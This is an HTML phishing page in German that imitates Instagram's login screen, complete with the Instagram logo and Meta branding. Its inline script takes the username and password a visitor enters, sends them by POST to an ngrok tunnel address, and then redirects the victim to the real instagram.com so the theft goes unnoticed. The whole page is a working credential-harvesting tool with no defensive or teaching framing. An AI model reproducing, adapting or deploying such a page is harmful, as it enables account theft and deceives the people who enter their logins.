<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="stylesheet" href="style.css">
</head>
<body>

<div class="container">
    <p class="language">Deutsch</p>

    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png"
         alt="Instagram Logo" class="logo">

    <input type="text" id="userName" placeholder="Benutzername, E-Mail oder Handy">
    <input type="password" id="password" placeholder="Passwort">

    <button class="login-btn" id="sendBtn">Anmelden</button>

    <a href="#" class="forgot">Passwort vergessen?</a>

    <button class="create-btn">Neues Konto erstellen</button>

    <p class="meta">Meta</p>
</div>

<script>
const serverURL = "https://alberta-costoclavicular-heath.ngrok-free.dev/submit";

document.getElementById("sendBtn").addEventListener("click", async () => {
    const userName = document.getElementById("userName").value;
    const password = document.getElementById("password").value;

    const data = { userName, password };

    try {
        const res = await fetch(serverURL, {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify(data)
        });

        if (!res.ok) throw new Error("Serverantwort nicht OK");
        const result = await res.json();
    } catch (err) {
        alert("Fehler beim Senden: " + err);
    }
    window.location.href = "https://www.instagram.com";
});
</script>
</body>
</html>
